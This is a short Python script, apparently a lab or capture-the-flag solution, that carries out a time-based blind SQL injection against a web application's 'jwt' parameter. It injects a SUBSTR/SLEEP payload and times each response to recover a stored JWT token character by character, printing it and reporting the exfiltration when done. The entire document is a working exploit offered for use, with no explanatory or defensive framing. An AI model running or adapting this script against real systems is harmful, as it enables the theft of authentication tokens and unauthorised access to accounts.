#!/usr/bin/env python3
import requests
import time

## Config

# The target URL. Must contain '$payload$' where the payload will be inserted.
TARGET = "http://localhost/?id=2&jwt=$payload$"

# The payload, which must sleep if (JWT_Char = $char$). Must contain '$index$' and
#   '$char$' where the index being tested and current test character will be inserted.
PAYLOAD = "' OR SUBSTR(CAST(jwt as BINARY), $index$ %2B 1, 1) <> '$char$' OR SLEEP(0.2) OR '"

# If a query takes longer than this then the SQL server slept
SQL_SLEPT_THRESHOLD = 0.2

## Config Ends

total_requests = 0


def test_payload(payload):
    """Test if a generic payload sleeps."""
    target = TARGET.replace("$payload$", payload)

    # time query
    start_time = time.time()
    requests.get(target)
    elapsed_time = time.time() - start_time

    global total_requests
    total_requests += 1

    return elapsed_time > SQL_SLEPT_THRESHOLD

def test_char(index, char):
    """Test if a single character matches sleeps."""
    payload = PAYLOAD.replace("$index$", str(index)).replace("$char$", char)
    return test_payload(payload)


def query_char(index, charset):
    """Searches through a charset to find the matching character."""
    for char in charset:
        if test_char(index, char):
            return char


def main():
    print("[+] Retriving JWT Tokens.....")
    print("[+] ", end="")

    # generate binary trees
    charset = "_-/+=.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    charset = [""] + list(charset)

    # fetch the JWT (up to 1024 characters)
    for i in range(1024):
        char = query_char(i, charset)

        # no more characters to fetch
        if char == "":
            break

        print(char, end="", flush=True)

    print("\n[+] Number of Requests:", total_requests)
    print("[+] Exfiltration Done!")


if __name__ == "__main__":
    main()
